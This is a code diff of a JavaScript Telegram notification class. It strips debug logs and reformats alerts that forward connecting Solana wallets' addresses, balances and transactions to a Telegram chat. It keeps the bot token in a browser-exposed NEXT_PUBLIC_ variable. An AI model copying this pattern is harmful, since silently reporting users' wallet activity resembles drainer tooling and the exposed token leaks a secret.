@@ -4,24 +4,15 @@ export class TelegramService {
   constructor() {
     this.botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
     this.chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
-    console.log('TelegramService initialized with:', {
-      botToken: this.botToken,
-      chatId: this.chatId
-    });
   }
 
   async sendMessage(message) {
     try {
-      console.log('Attempting to send Telegram message...');
-      console.log('Bot Token:', this.botToken);
-      console.log('Chat ID:', this.chatId);
-      
       if (!this.botToken || !this.chatId) {
         throw new Error('Missing Telegram credentials');
       }
 
       const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
-      console.log('Sending request to:', url);
       
       const response = await axios.post(url, {
         chat_id: this.chatId,
@@ -29,13 +20,8 @@ export class TelegramService {
         parse_mode: 'HTML'
       });
       
-      console.log('Telegram API Response:', response.data);
       return response.data;
     } catch (error) {
-      console.error('Error sending Telegram message:', error.message);
-      if (error.response) {
-        console.error('Telegram API Error Response:', error.response.data);
-      }
       throw error;
     }
   }
@@ -48,15 +34,15 @@ export class TelegramService {
       timestamp
     } = walletData;
 
-    return `
-🔐 <b>New Wallet Connection</b>
-
-👤 Wallet: <code>${publicKey}</code>
-💰 Balance: ${balance} SOL
-⏰ Time: ${new Date(timestamp).toLocaleString()}
-
-📊 Recent Transactions: ${transactions.length}
-    `;
+    return `🔐 <b>New Wallet Connection</b>\n\n` +
+           `👤 <b>Wallet Address:</b>\n` +
+           `<code>${publicKey}</code>\n\n` +
+           `💰 <b>Balance:</b>\n` +
+           `${balance.toFixed(2)} SOL\n\n` +
+           `⏰ <b>Connection Time:</b>\n` +
+           `${new Date(timestamp).toLocaleString()}\n\n` +
+           `📊 <b>Recent Activity:</b>\n` +
+           `${transactions.length} transactions found`;
   }
 
   formatTransactionInfo(txData) {
@@ -67,13 +53,14 @@ export class TelegramService {
       timestamp
     } = txData;
 
-    return `
-💸 <b>New Transaction</b>
-
-📝 Signature: <code>${signature}</code>
-💰 Amount: ${amount} SOL
-📤 Type: ${type}
-⏰ Time: ${new Date(timestamp).toLocaleString()}
-    `;
+    return `💸 <b>New Transaction Detected</b>\n\n` +
+           `📝 <b>Transaction Signature:</b>\n` +
+           `<code>${signature}</code>\n\n` +
+           `💰 <b>Amount:</b>\n` +
+           `${amount.toFixed(2)} SOL\n\n` +
+           `📤 <b>Type:</b>\n` +
+           `${type.charAt(0).toUpperCase() + type.slice(1)}\n\n` +
+           `⏰ <b>Time:</b>\n` +
+           `${new Date(timestamp).toLocaleString()}`;
   }
 } 
